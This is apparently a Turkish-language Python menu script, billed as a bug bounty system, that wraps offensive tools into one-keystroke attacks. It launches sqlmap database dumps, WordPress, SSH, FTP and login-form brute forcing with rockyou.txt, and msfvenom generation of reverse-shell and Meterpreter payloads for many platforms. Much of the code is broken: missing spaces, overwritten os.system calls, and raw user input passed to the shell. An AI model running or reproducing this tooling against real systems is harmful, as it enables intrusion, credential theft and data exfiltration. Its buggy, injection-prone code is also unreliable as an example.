#!/usr/bin/env python

import os 

os.system("clear")
os.system("figlet -ctf Electronic  FRSEC | lolcat")


print("""
	
	FrSec Bug Bounty Hunting Sistemine Hosgeldiniz!
	
	""")

print("""
	
	Uygulama Sec :

		1) Nmap 
		2) Gobuster
		3) Nikto
		4) Sqlmap
		5) Wpscan
		6) John
		7) Msfvenom
		8) Base Sifre
		9) Serverlar
		10) Hydra
		11) Samba

	00) Exit

	""")

# Eklenecek : samba,,hydra

uygulamano= input("Numara Giriniz : ")


if(uygulamano == "1"):
	
	print("""

		Nmap Tarama Aracina Hosgeldiniz

			1) Hizli Ve Secilmis Portlar
			2) Hizli Ve Secilmis Portlar(-Pn)
			3) Hizli Ve Secilmis Portlar(-oN)
			4) Ayrintili Ve Secilmis Portlar 
			5) Ayrintili Ve Secilmis Portlar(-Pn)
			6) Ayrintili Ve Secilmis Portlar(-On)
			7) Hizli Ve Tum Portlar
			8) Hizli Ve Tum Portlar(-Pn)
			9) Hizli Ve Tum Portlar(-oN)
			10) Ayrintili Ve Tum Portlar
			11) Ayrintili Ve Tum Portlar(-Pn)
			12) Ayrintili Ve Tum Portlar(-oN)

		99) Ana Menuye Don Yada Cik 

		""")

	taramano= input("Tarama Seklini Sec : ")

	if(taramano == "1"):

		hedefip= input("Hedef Ip Giriniz: ")
		os.system("nmap " + hedefip )

	if(taramano == "2"):

		hedefip= input("Hedef Ip Giriniz: ")
		os.system("nmap -Pn" + hedefip )

	if(taramano == "3"):

		kayityeri= input("Kayit Etmek Istediginiz Yeri Giriniz: ")
		hedefip= input("Hedef Ip Giriniz: ")
		os.system("nmap " + hedefip + " -oN" + kayityeri )

	if(taramano == "4"):

		hedefip= input("Hedef Ip Giriniz: ")
		os.system("nmap -sSCV -A -O -vv " + hedefip )
	
	if(taramano == "5"):

		hedefip= input("Hedef Ip Giriniz: ")
		os.system("nmap -sSCV -A -O -Pn" + hedefip )

	if(taramano == "6"):

		kayityeri= input("Kayit Etmek Istediginiz Yeri Giriniz: ")
		hedefip= input("Hedef Ip Giriniz: ")
		os.system("nmap -sSCV -A -O " + hedefip + " -oN" + kayityeri )

	if(taramano == "7"):

		hedefip= input("Hedef Ip Giriniz: ")
		os.system("nmap -p-" + hedefip )

	if(taramano == "8"):

		hedefip= input("Hedef Ip Giriniz: ")
		os.system("nmap -p- -Pn " + hedefip )

	if(taramano == "9"):

		kayityeri= input("Kayit Etmek Istediginiz Yeri Giriniz: ")
		hedefip= input("Hedef Ip Giriniz: ")
		os.system("nmap -p- " + hedefip + " -oN" + kayityeri )

	if(taramano == "10"):

		hedefip= input("Hedef Ip Giriniz: ")
		os.system("nmap -sSCV -A -O -p- -vv " + hedefip )

	if(taramano == "11"):

		hedefip= input("Hedef Ip Giriniz: ")
		os.system("nmap -sSCV -A -O -p- -Pn -vv " + hedefip )

	if(taramano == "12"):

		kayityeri= input("Kayit Etmek Istediginiz Yeri Giriniz: ")
		hedefip= input("Hedef Ip Giriniz: ")
		os.system("nmap -sSCV -A -O -p- -vv" + hedefip + " -oN" + kayityeri )

	if(taramano == "99"):

		yon= input ("Ana Menuye Don Yada Cik (y/n)")

		if(yon == "y"):
			os.system("python3 frsec.py")

		elif(yon == "n"):
			print("Yine Gel :*")

		else:
			print("Oyle bir Cevap Yok")


if(uygulamano == "2"):

	print("""

		Gobuster Tarama Aracina Hosgeldiniz

			1) Common.txt
			2) Common.txt -o
			3) Big.txt
			4) Big.txt -o
			5) Small.txt
			6) Small.txt -o
			7) Small.txt -x
			8) Medium.txt 
			9) Medium.txt -o
			10) Medium.txt -x

		99) Ana Menuye Don Yada Cik 

	""")

	sifreno= input("Kullanmak Istedigin Sifreyi Sec : ")
	
	if(sifreno == "1"):

		hedefurl= input("Hedef Url Giriniz : ")
		os.system("gobuster dir -u" + hedefurl + " -w /usr/share/dirb/wordlists/common.txt" )

	if(sifreno == "2"):

		hedefurl= input("Hedef Url Giriniz : ")
		kayityeri= input("Kayit Etmek Istediginiz Yeri Giriniz : ")
		os.system("gobuster dir -u" + hedefurl + " -w /usr/share/dirb/wordlists/common.txt -o" + kayityeri )

	if(sifreno == "3"):

		hedefurl= input("Hedef Url Giriniz : ")
		os.system("gobuster dir -u" + hedefurl + " -w /usr/share/dirb/wordlists/big.txt" )

	if(sifreno == "4"):

		hedefurl= input("Hedef Url Giriniz : ")
		kayityeri= input("Kayit Etmek Istediginiz Yeri Giriniz : ")
		os.system("gobuster dir -u" + hedefurl + " -w /usr/share/wordlists/big.txt -o" + kayityeri )

	if(sifreno == "5"):

		hedefurl= input("Hedef Url Giriniz : ")
		os.system("gobuster dir -u" + hedefurl + " -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt" )


	if(sifreno == "6"):	

		hedefurl= input("Hedef Url Giriniz : ")
		kayityeri= input("Kayit Etmek Istediginiz Yeri Giriniz : ")
		os.system("gobuster dir -u" + hedefurl + " -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -o" + kayityeri )

	if(sifreno == "7"):		

		hedefurl= input("Hedef Url Giriniz : ")
		dosyauzanti= input("Taramak Istediginiz Dosya Uzantilarini Giriniz : ")
		os.system("gobuster dir -u" + hedefurl + " -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x" + dosyauzanti )

	if(sifreno == "8"):	

		hedefurl= input("Hedef Url Giriniz : ")
		os.system("gobuster dir -u" + hedefurl + " -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt" )

	if(sifreno == "9"):			

		hedefurl= input("Hedef Url Giriniz : ")
		kayityeri= input("Kayit Etmek Istediginiz Yeri Giriniz : ")
		os.system("gobuster dir -u" + hedefurl + " -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o" + kayityeri )

	if(sifreno == "10"):	

		hedefurl= input("Hedef Url Giriniz : ")
		dosyauzanti= input("Taramak Istediginiz Dosya Uzantilarini Giriniz : ")
		os.system("gobuster dir -u" + hedefurl + " -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x" + dosyauzanti )

	if(sifreno == "99"):

		yon= input ("Ana Menuye Don Yada Cik (y/n)")

		if(yon == "y"):
			os.system("python3 frsec.py")

		elif(yon == "n"):
			print("Yine Gel :*")

		else:
			print("Oyle bir Cevap Yok")	


if(uygulamano == "3"):

	print("""

			Nikto Ile Tarama Aracina Hosgeldiniz(Yakin Zamanda Gelistirilecek)
		
		""")

	hedefurl= input("Lutfen Url Giriniz : ")
	os.system("nikto -h " + hedefurl )


if(uygulamano == "4"):

	print("""

		Sqlmap Tarama Aracina Hosgeldiniz		
			
			1) Url Uzerinden Tarama
			2) Dosya Uzerinden Tarama

		00) Exit

	""")

	sqlno= input("Numara Giriniz : ")

	if(sqlno == "1"):

		print("""

				1) Forum Siteleri 
				2) Standart Siteler

		 """)

		siteno= input("Numara Giriniz : ")

		if(siteno == "1"):

			print("""

					1) Veritabanlarinin Ismini Ogrenme
					2) Tablolarin Ismini Ogrenme
					3) Sutunlarin Ismini Ogrenme
					4) Icerigi Dokme
					5) Herseyi Dokme (Dikkat)	

				99) Ana Menuye Don Yada Cik

			""")

			ogrenmeno= input("Dokmek Istediginiz Secenegi Secin : ")
     		
			if(ogrenmeno == "1"):

				hedefurl= input("Hedef Url Giriniz : ")
				os.system("sqlmap -u" + hedefurl + " --dbs --forms" )

			if(ogrenmeno == "2"):
				
				databaseno= input("Veritabani Ismi Giriniz : ")
				hedefurl= input("Hedef Url Giriniz : ")	
				os.system("sqlmap -u" + hedefurl + " -D" + databaseno + " --tables --forms" )

			if(ogrenmeno == "3"):

				databaseno= input("Veritabani Ismi Giriniz : ")
				tablesno= input("Tablo Ismi Giriniz : ")	
				hedefurl= input("Hedef Url Giriniz : ")
				os.system("sqlmap -u" + hedefurl + " -D" + databaseno + " -T" + tablesno + " --columns --forms" )

			if(ogrenmeno == "4"):

				databaseno= input("Veritabani Ismi Giriniz : ")
				tablesno= input("Tablo Ismi Giriniz : ")
				columnsno= input("Stun Ismi Giriniz : ")
				hedefurl= input("Hedef Url Giriniz : ")
				os.system("sqlmap -u" + hedefurl + " -D" + databaseno + " -T" + tablesno + " -C" + columnsno + " --dump --forms" ) 

			if(ogrenmeno == "5"):
				
				hedefurl= input("Hedef Url Giriniz : ")	
				os.system("sqlmap - u" + hedefurl + " --dump-all")

			if(ogrenmeno == "99"):

				yon= input ("Ana Menuye Don Yada Cik (y/n)")

				if(yon == "y"):
					os.system("python3 frsec.py")

				elif(yon == "n"):
					print("Yine Gel :*")

				else:
					print("Oyle bir Cevap Yok")

		if(siteno == "2"):		

			print("""

					1) Veritabanlarinin Ismini Ogrenme
					2) Tablolarin Ismini Ogrenme
					3) Sutunlarin Ismini Ogrenme
					4) Icerigi Dokme
					5) Herseyi Dokme
					
				99) Ana Menuye Don Yada Cik

			""")

			ogrenmeno= input("Dokmek Istediginiz Secenegi Secin : ")

			if(ogrenmeno == "1"):

				hedefurl= input("Hedef Url Giriniz : ")
				os.system("sqlmap -u " + hedefurl + " --dbs --random-agent" )

			if(ogrenmeno == "2"):
				
				databaseno= input("Veritabani Ismi Giriniz : ")
				hedefurl= input("Hedef Url Giriniz : ")	
				os.system("sqlmap -u " + hedefurl + " -D " + databaseno + " --tables --random-agent" )

			if(ogrenmeno == "3"):

				databaseno= input("Veritabani Ismi Giriniz : ")
				tablesno= input("Tablo Ismi Giriniz : ")	
				hedefurl= input("Hedef Url Giriniz : ")
				os.system("sqlmap -u " + hedefurl + " -D " + databaseno + " -T " + tablesno + " --columns --random-agent" )

			if(ogrenmeno == "4"):

				databaseno= input("Veritabani Ismi Giriniz : ")
				tablesno= input("Tablo Ismi Giriniz : ")
				columnsno= input("Stun Ismi Giriniz : ")
				hedefurl= input("Hedef Url Giriniz : ")
				os.system("sqlmap -u " + hedefurl + " -D " + databaseno + " -T " + tablesno + " -C " + columnsno + " --dump --random-agent" ) 

			if(ogrenmeno == "5"):

				hedefurl= input("Hedef Url Giriniz : ")
				os.system("sqlmap -u" + hedefurl + " --dump-all" )

			if(ogrenmeno == "99"):

				yon= input ("Ana Menuye Don Yada Cik (y/n)")

				if(yon == "y"):
					os.system("python3 frsec.py")

				elif(yon == "n"):
					print("Yine Gel :*")

				else:
					print("Oyle bir Cevap Yok")			

	if(sqlno == "2"):

		print("""

					1) Veritabanlarinin Taramasi 
					2) Tablolarin Taramasi
					3) Sutunlarin Taramasi
					4) Icerigi Dokme

				99) Ana Menuye Don Yada Cik	

			""")

		taramano= input("Taramak Istediginiz Numara : ")

		if(taramano == "1"):

			hedefdosya= input("Dosya'nin Bulundugu Konumu Giriniz : ")
			os.system("sqlmap -r" + hedefdosya + " --current-db" )

		if(taramano == "2"):

			hedefdosya= input("Dosya'nin Bulundugu Konumu Giriniz : ")
			databaseno= input("Veritabani Ismi Giriniz : ")
			os.system("sqlmap -r" + hedefdosya + " -D" + databaseno + " --tables" )

		if(taramano == "3"):

			hedefdosya= input("Dosya'nin Bulundugu Konumu Giriniz : ")
			databaseno= input("Veritabani Ismi Giriniz : ")
			tablesno= input("Tablo Ismi Giriniz : ")
			os.system("sqlmap -r" + hedefdosya + " -D" + databaseno + " -T" + tablesno + " --columns") 

		if(taramano == "4"):

			hedefdosya= input("Dosya'nin Bulundugu Konumu Giriniz : ")
			databaseno= input("Veritabani Ismi Giriniz : ")
			tablesno= input("Tablo Ismi Giriniz : ")
			columnsno= input("Sutun Ismi Giriniz : ")
			os.system("sqlmap -r" + hedefdosya + " -D" + databaseno + " -T" + tablesno + " -C" + columnsno + " --dump" )

		if(taramano == "99"):

			yon= input("Ana Menuye Don Yada Cik (y/n)")

			if(yon == "y"):
				os.system("python3 frsec.py")

			elif(yon == "n"):
				print("Yine Gel :*")

			else:
				print("Oyle bir Cevap Yok")


if(uygulamano == "5"):

	print("""

			Wpscan Aracina Hosgeldiniz!

				1) Kullanicilari Bulma 
				2) Secilen Kullaniciya Brute-Force Attack (Otomatik Sifre Listesi Rockyou.txt)
				3) Secilen Kullaniciya Brute-Force Attack (Kendi Sifre Listen)
				4) Tum Kullanicilara Brute-Force Attack (Otomatik Sifre Listesi Rockyou.txt)
				5) Tum Kullanicilara Brute-Force Attack (Kendi Sifre Listen)

			99) Ana Menuye Don Yada Cik 

		""")

	taramano= input("Numara Giriniz : ")

	if(taramano == "1"):

		hedefurl= input("Hedef Url Giriniz : ")
		os.system("wpscan --url" + hedefurl + " -e u" )

	if(taramano == "2"):

		hedefurl= input("Hedef Url Giriniz : ")
		hedefisim= input("Hedef Kullanici Ismini Giriniz : ")
		os.system("wpscan --url" + hedefurl + " -U" + hedefisim + " -P /usr/share/wordlists/rockyou.txt" )

	if(taramano == "3"):

		hedefurl= input("Hedef Url Giriniz : ")
		hedefisim= input("Hedef Kullanici Ismini Giriniz : ")
		sifreno= input("Kullanmak Istediginiz Sifre Listesini Giriniz : ")
		os.system("wpscan --url" + hedefurl + " -U" + hedefisim + " -P" + sifreno )

	if(taramano == "4"):

		hedefurl= input("Hedef Url Giriniz : ")
		os.system=("wpscan --url" + hedefurl + " -e u -P /usr/share/wordlists/rockyou.txt" )

	if(taramano == "5"):

		hedefurl= input("Hedef Url Giriniz : ")
		sifreno= input("Kullanmak Istediginiz Sifre Listesini Giriniz : ")
		os.system=("wpscan --url" + hedefurl + " -e u -P" + sifreno )

	if(taramano == "99"):

		yon= input("Ana Menuye Don Yada Cik (y/n)")

		if(yon == "y"):
			os.system("python3 frsec.py")

		elif(yon == "n"):
			print("Yine Gel :*")

		else:
			print("Oyle bir Cevap Yok")
		

if(uygulamano == "6"):

	print("""

			John Aracina Hosgeldiniz

				1) Sifre Kirma (Oromatik Secili Sifre Listesi Rockyou.txt)
				2) Sifre Kirma (Kendi Belirledigin Sifre Listesi)

			99)	
				
		""")

	sifreno= input("Numara Giriniz : ")

	if(sifreno == "1"):

		hedefdosya= input("Sifre'nin Bulundugu Yeri Giriniz : ")
		os.system("john" + hedefdosya + " --wordlist=/usr/share/wordlists/rockyou.txt" )

	if(sifreno == "2"):

		hedefdosya= input("Sifre'nin Bulundugu Yeri Giriniz : ")
		passwd= input ("Sifre Listesini Giriniz : ")
		os.system("john" + hedefdosya + " --wordlist=" + passwd )

	if(sifreno == "99"):

		yon= input("Ana Menuye Don Yada Cik (y/n)")

		if(yon == "y"):
			os.system("python3 frsec.py")

		elif(yon == "n"):
			print("Yine Gel :*")

		else:
			print("Oyle bir Cevap Yok")


if(uygulamano == "7"):

	print("""

			Msfvenom Aracina Hosgeldiniz

				1) APK (.apk)
   				2) ASP (.asp)
   				3) ASPX (.aspx)
   				4) Bash (.sh)
   				5) Java (.jsp)
   				6) Linux (.elf)
   				7) OSX (.macho)
   				8) Perl (.pl)
   				9) PHP (.php)
   				10) Powershell (.ps1)
  			        11) Python (.py)
   				12) Tomcat (.war)
   				13) Windows (.exe)

   			99) Ana Menuye Don Yada Cik	

		""")

	payloadno= input("Trojen Ismi Giriniz : ")

	if(payloadno == "1"):

		print("""

				1) Meterpreter
				2) Shell

			""")

		exploitno= input("Payload Turunu Giriniz : ")

		if(exploitno == "1"):

			lhost= input("Kendi Ip'nizi Giriniz : ")
			lport= input("Portu Giriniz : ")
			kayityeri= input("Kayit Yerini Giriniz (shell.apk) : ")
			os.system= input("msfvenom -p android/meterpreter_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f apk -o" + kayityeri )

		if(exploitno == "2"):

			lhost= input("Kendi Ip'nizi Giriniz : ")
			lport= input("Portu Giriniz : ")
			kayityeri= input("Kayit Yerini Giriniz (shell.apk) : ")
			os.system= input("msfvenom -p android/shell/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f apk -o" + kayityeri )

	

	if(payloadno == "2"):

		print("""
				
				1) Meterpreter
				2) Shell				

			""")

		exploitno= input("Payload Turunu Giriniz : ")

		if(exploitno == "1"):

			lhost= input("Kendi Ip'nizi Giriniz : ")
			lport= input("Portu Giriniz : ")
			kayityeri= input("Kayit Yerini Giriniz (shell.asp) : ")
			os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f asp -o" + kayityeri )

		if(exploitno == "2"):

			lhost= input("Kendi Ip'nizi Giriniz : ")
			lport= input("Portu Giriniz : ")
			kayityeri= input("Kayit Yerini Giriniz (shell.asp) : ")
			os.system("msfvenom -p windows/shell_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f asp -o" + kayityeri )



	if(payloadno == "3"):
    		
			print("""

					1) Meterpreter
					2) Shell

				""")
			   
			exploitno= input("Payload Turunu Giriniz : ")

			if(exploitno == "1"):

				lhost= input("Kendi Ip'nizi Giriniz : ")
				lport= input("Portu Giriniz : ")
				kayityeri= input("Kayit Yerini Giriniz (shell.aspx) : ")
				os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f aspx -o" + kayityeri )

			if(exploitno == "2"):

				lhost= input("Kendi Ip'nizi Giriniz : ")
				lport= input("Portu Giriniz : ")
				kayityeri= input("Kayit Yerini Giriniz (shell.aspx) : ")
				os.system("msfvenom -p windows/shell_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f aspx -o" + kayityeri )



	if(payloadno == "4"):

			print("""

					1) Cmd/Unix

				""")

			exploitno= input("Payload Turunu Giriniz : ")

			if(exploitno == "1"):

				lhost= input("Kendi Ip'nizi Giriniz : ")
				lport= input("Portu Giriniz : ")
				kayityeri= input("Kayit Yerini Giriniz (shell.sh) : ")
				os.system("msfvenom -p cmd/unix/reverse_bash LHOST=" + lhost + " LPORT=" + lport + " -f raw -o" + kayityeri )

	

	if(payloadno == "5"):

			print("""

					1) Java/Jsp

				""")

			exploitno= input("Payload Turunu Giriniz : ")

			if(exploitno == "1"):

				lhost= input("Kendi Ip'nizi Giriniz : ")
				lport= input("Portu Giriniz : ")
				kayityeri= input("Kayit Yerini Giriniz (shell.jsp) : ")
				os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f raw -o" + kayityeri )



	if(payloadno == "6"):

		print("""
				
				1) Meterpreter
				2) Shell				

			""")

		exploitno= input("Payload Turunu Giriniz : ")

		if(exploitno == "1"):

			lhost= input("Kendi Ip'nizi Giriniz : ")
			lport= input("Portu Giriniz : ")
			kayityeri= input("Kayit Yerini Giriniz (shell.elf) : ")
			os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f elf -o" + kayityeri )

		if(exploitno == "2"):

			lhost= input("Kendi Ip'nizi Giriniz : ")
			lport= input("Portu Giriniz : ")
			kayityeri= input("Kayit Yerini Giriniz (shell.elf) : ")
			os.system("msfvenom -p linux/x64/shell_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f elf -o" + kayityeri )



	if(payloadno == "7"):


		print("""
				
				1) Shell
				2) Bind				

			""")

		exploitno= input("Payload Turunu Giriniz : ")

		if(exploitno == "1"):

			lhost= input("Kendi Ip'nizi Giriniz : ")
			lport= input("Portu Giriniz : ")
			kayityeri= input("Kayit Yerini Giriniz (shell.macho) : ")
			os.system("msfvenom -p osx/x86/shell_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f macho -o" + kayityeri )

		if(exploitno == "2"):

			lhost= input("Kendi Ip'nizi Giriniz : ")
			lport= input("Portu Giriniz : ")
			kayityeri= input("Kayit Yerini Giriniz (shell.macho) : ")
			os.system("msfvenom -p osx/x86/shell_bind_tcp LHOST=" + lhost + " LPORT=" + lport + " -f macho -o" + kayityeri )



	if(payloadno == "8"):

		print("""
				
				1) Cmd/Unix			

			""")

		exploitno= input("Payload Turunu Giriniz : ")

		if(exploitno == "1"):

			lhost= input("Kendi Ip'nizi Giriniz : ")
			lport= input("Portu Giriniz : ")
			kayityeri= input("Kayit Yerini Giriniz (shell.pl) : ")
			os.system("msfvenom -p cmd/unix/_reverse_perl LHOST=" + lhost + " LPORT=" + lport + " -f raw -o" + kayityeri )



	if(payloadno == "9"):

		print("""

				1) Meterpreter
			
			""")

		exploitno= input("Payload Turunu Giriniz : ")

		if(exploitno == "1"):

			lhost= input("Kendi Ip'nizi Giriniz : ")
			lport= input("Portu Giriniz : ")
			kayityeri= input("Kayit Yerini Giriniz (shell.php) : ")
			os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f raw -o" + kayityeri )



	if(payloadno == "10"):

		print("""

				1) Meterpreter
			
			""")

		exploitno= input("Payload Turunu Giriniz : ")

		if(exploitno == "1"):

			lhost= input("Kendi Ip'nizi Giriniz : ")
			lport= input("Portu Giriniz : ")
			kayityeri= input("Kayit Yerini Giriniz (shell.ps1) : ")
			os.system("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f psh -o" + kayityeri )



	if(payloadno == "11"):

		print("""

				1) Cmd/Unix 
			
			""")

		exploitno= input("Payload Turunu Giriniz : ")

		if(exploitno == "1"):

			lhost= input("Kendi Ip'nizi Giriniz : ")
			lport= input("Portu Giriniz : ")
			kayityeri= input("Kayit Yerini Giriniz (shell.py) : ")
			os.system("msfvenom -p cmd/unix/reverse_python LHOST=" + lhost + " LPORT=" + lport + " -f raw -o" + kayityeri )



	if(payloadno == "12"):

		print("""

				1) Java/War
			
			""")

		exploitno= input("Payload Turunu Giriniz : ")

		if(exploitno == "1"):

			lhost= input("Kendi Ip'nizi Giriniz : ")
			lport= input("Portu Giriniz : ")
			kayityeri= input("Kayit Yerini Giriniz (shell.war) : ")
			os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f war -o" + kayityeri )



	if(payloadno == "13"):

		print("""

				1) Meterpreter
				2) Bind
				3) Shell
			
			""")

		exploitno= input("Payload Turunu Giriniz : ")

		if(exploitno == "1"):

			lhost= input("Kendi Ip'nizi Giriniz : ")
			lport= input("Portu Giriniz : ")
			kayityeri= input("Kayit Yerini Giriniz (shell.exe) : ")
			os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f exe -o" + kayityeri )

		if(exploitno == "2"):

			lhost= input("Kendi Ip'nizi Giriniz : ")
			lport= input("Portu Giriniz : ")
			kayityeri= input("Kayit Yerini Giriniz (shell.exe) : ")
			os.system("msfvenom -p windows/meterpreter/bind_tcp LHOST=" + lhost + " LPORT=" + lport + " -f exe -o" + kayityeri )

		if(exploitno == "3"):

			lhost= input("Kendi Ip'nizi Giriniz : ")
			lport= input("Portu Giriniz : ")
			kayityeri= input("Kayit Yerini Giriniz (shell.exe) : ")
			os.system("msfvenom -p windows/shell/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f exe -o" + kayityeri )



	if(payloadno == "99"):

		yon= input("Ana Menuye Don Yada Cik (y/n)")

		if(yon == "y"):
			os.system("python3 frsec.py")

		elif(yon == "n"):
			print("Yine Gel :*")

		else:
			print("Oyle bir Cevap Yok")


if(uygulamano == "8"):

	print("""

		Base Kirma Aracina Hosgeldiniz

			1) Bae64
			2) Base32				

		99) Ana Menuye Don Yada Cik

		""")

	baseno= input("Numara Giriniz : ")

	if(baseno == "1"):

		sifrehash= input("Kirilicek Hash'i Giriniz : ")
		os.system("base64 -n" + sifrehash + " | base64 -d;echo""")

	if(baseno == "2"):

		sifrehash= input("Kirilicek Hash'i Giriniz : ")
		os.system("base32 -n" + sifrehash + " | base32 -d;echo""")

	if(baseno == "99"):

		yon= input("Ana Menuye Don Yada Cik (y/n)")

		if(yon == "y"):
			os.system("python3 frsec.py")

		elif(yon == "n"):
			print("Yine Gel :*")

		else:
			print("Oyle bir Cevap Yok")


if(uygulamano == "9"):

	print("""

		Server Araclarina Hosgeldiniz

			1) Python3
			2) Python
			3) Apache2

		99) Ana Menuye Don Yada Cik	

		""")

	serverno= input("Numara Giriniz : ")

	if(serverno == "1"):

		port= input("Port Numarasini Giriniz : ")
		os.system("python3 -m http.server" + port )

	if(serverno == "2"):

		port= input("Port Numarasini Giriniz : ")
		os.system("python -m SimpleHTTPServer" + port )

	if(serverno == "3"):
	
		os.system("service apache2 start" )

	if(serverno == "99"):

		yon= input("Ana Menuye Don Yada Cik (y/n)")

		if(yon == "y"):
			os.system("python3 frsec.py")

		elif(yon == "n"):
			print("Yine Gel :*")

		else:
			print("Oyle bir Cevap Yok")


if(uygulamano == "10"):

	print("""

		Hydra Aracina Hosgeldiniz

			1) Ssh
			2) Ftp
			3) Form			

		99) Ana Menuye Don Yada Cik

		""")

	hydrano= input("Numara Giriniz : ")

	if(hydrano == "1"):

		print("""

				1) Ssh (Pass Listesi)
				2) Ssh (User Listesi)
				3) Ssh (Pass Ve User Listesi)

			99) Ana Menuye Don Yada Cik

			""")

		sshno= input("Numara Giriniz : ")

		if(sshno == "1"):

			username= input("Username Giriniz : ")
			passlist= input("Pass Listesini Giriniz : ")
			hedefip= input("Hedef Ip Giriniz : ")
			os.system("hydra -l " + username + " -P " + passlist + " " + hedefip + " -t 4 ssh " )

		if(sshno == "2"):

			username= input("User Listesini Giriniz : ")
			passlist= input("Password Giriniz : ")
			hedefip= input("Hedef Ip Giriniz : ")
			os.system("hydra -L" + username + " -p" + passlist + "" + hedefip + " -t 4 ssh" )

		if(sshno == "3"):

			username= input("User Listesini Giriniz : ")
			passlist= input("Pass Listesini Giriniz : ")
			hedefip= input("Hedef Ip Giriniz : ")
			os.system("hydra -L" + username + " -P" + passlist + "" + hedefip + " -t 4 ssh" )

		if(sshno == "99"):

			yon= input("Ana Menuye Don Yada Cik (y/n)")

			if(yon == "y"):
				os.system("python3 frsec.py")

			elif(yon == "n"):
				print("Yine Gel :*")

			else:
				print("Oyle bir Cevap Yok")

	if(hydrano == "2"):

		print("""

				1) Ftp (Pass Listesi)
				2) Ftp (User Listesi)
				3) Ftp (Pass Ve User Listesi)

			99) Ana Menuye Don Yada Cik

			""")

		ftpno= input("Numara Giriniz : ")

		if(ftpno == "1"):

			username= input("Username Giriniz : ")
			passlist= input("Pass Listesini Giriniz : ")
			hedefip= input("Hedef Ip Giriniz : ")
			os.system("hydra -l" + username + " -P" + passlist + " ftp://" + hedefip )

		if(ftpno == "2"):

			username= input("User Listesini Giriniz : ")
			passlist= input("Password Giriniz : ")
			hedefip= input("Hedef Ip Giriniz : ")
			os.system("hydra -L" + username + " -p" + passlist + " ftp://" + hedefip )

		if(ftpno == "3"):

			username= input("User Listesini Giriniz : ")
			passlist= input("Pass Listesini Giriniz : ")
			hedefip= input("Hedef Ip Giriniz : ")
			os.system("hydra -L" + username + " -P" + passlist + " ftp://" + hedefip )


		if(ftpno == "99"):

			yon= input("Ana Menuye Don Yada Cik (y/n)")

			if(yon == "y"):
				os.system("python3 frsec.py")

			elif(yon == "n"):
				print("Yine Gel :*")

			else:
				print("Oyle bir Cevap Yok")

	if(hydrano == "3"):

		print("""

				1) Form (Pass Listesi)
				2) Form (User Listesi)
				3) Form (Pass Ve User Listesi)

			99) Ana Menuye Don Yada Cik

			""")

		formno= input("Numara Giriniz : ")

		if(formno == "1"):

			username= input("Username Giriniz : ")
			passlist= input("Pass Listesini Giriniz : ")
			hedefip= input("Hedef Ip Giriniz : ")
			login= input("Giris Sekmesini Giriniz : ")
			userw= input("^User^= Giriniz : ")
			passw= input("^Pass^= Giriniz : ")
			os.system("hydra -l" + username + " -P" + passlist + "" + hedefip + " http-post-form" " '/" + login +":" + userw +"=^USER^&" + passw + "=^PASS^:Username or password invalid' -f" )

		if(formno == "2"):

			username= input("User Listesini Giriniz : ")
			passlist= input("Password Giriniz : ")
			hedefip= input("Hedef Ip Giriniz : ")
			login= input("Giris Sekmesini Giriniz : ")
			userw= input("^User^= Giriniz : ")
			passw= input("^Pass^= Giriniz : ")
			os.system("hydra -L" + username + " -p" + passlist + "" + hedefip + " http-post-form" " '/" + login +":" + userw +"=^USER^&" + passw + "=^PASS^:Username or password invalid' -f" )

		if(formno == "3"):

			username= input("User Listesini Giriniz : ")
			passlist= input("Pass Listesini Giriniz : ")
			hedefip= input("Hedef Ip Giriniz : ")
			login= input("Giris Sekmesini Giriniz : ")
			userw= input("^User^= Giriniz : ")
			passw= input("^Pass^= Giriniz : ")
			os.system("hydra -L " + username + " -P " + passlist + "" + hedefip + " http-post-form" " '/" + login +":" + userw +"=^USER^&" + passw + "=^PASS^:Username or password invalid' -f " )

		if(formno == "99"):

			yon= input("Ana Menuye Don Yada Cik (y/n)")

			if(yon == "y"):
				os.system("python3 frsec.py")

			elif(yon == "n"):
				print("Yine Gel :*")

			else:
				print("Oyle bir Cevap Yok")


	if(hydrano == "99"):

		yon= input("Ana Menuye Don Yada Cik (y/n)")

		if(yon == "y"):
			os.system("python3 frsec.py")

		elif(yon == "n"):
			print("Yine Gel :*")

		else:
			print("Oyle bir Cevap Yok")


if(uygulamano == "11"):

	print("""

		Samba Aracina Hosgeldiniz

			1) 445 Taramasi
			2) Smbclient Kullanici Listeleme	
			3) Kullanici Girisi

		99) Ana Menuye Don Yada Cik	

		""")
	
	sambano= input("Numara Giriniz : ")	

	if(sambano == "1"):

		hedefip= input("Hedef Ip Giriniz : ")
		os.system("nmap -p 445 --script=smb-enum-users.nse" + hedefip)

	if(sambano == "2"):

		hedefip= input("Hedef Ip Giriniz : ")
		os.system("smbclient -L ////" + hedefip )

	if(sambano == "3"):

		hedefip= input("Hedef Ip Giriniz : ")
		username= input("Username Giriniz : ")
		os.system("smbclient //" + hedefip + "/" + username )

	if(sambano == "99"):

		yon= input("Ana Menuye Don Yada Cik (y/n)")

		if(yon == "y"):
			os.system("python3 frsec.py")

		elif(yon == "n"):
			print("Yine Gel :*")

		else:
			print("Oyle bir Cevap Yok")











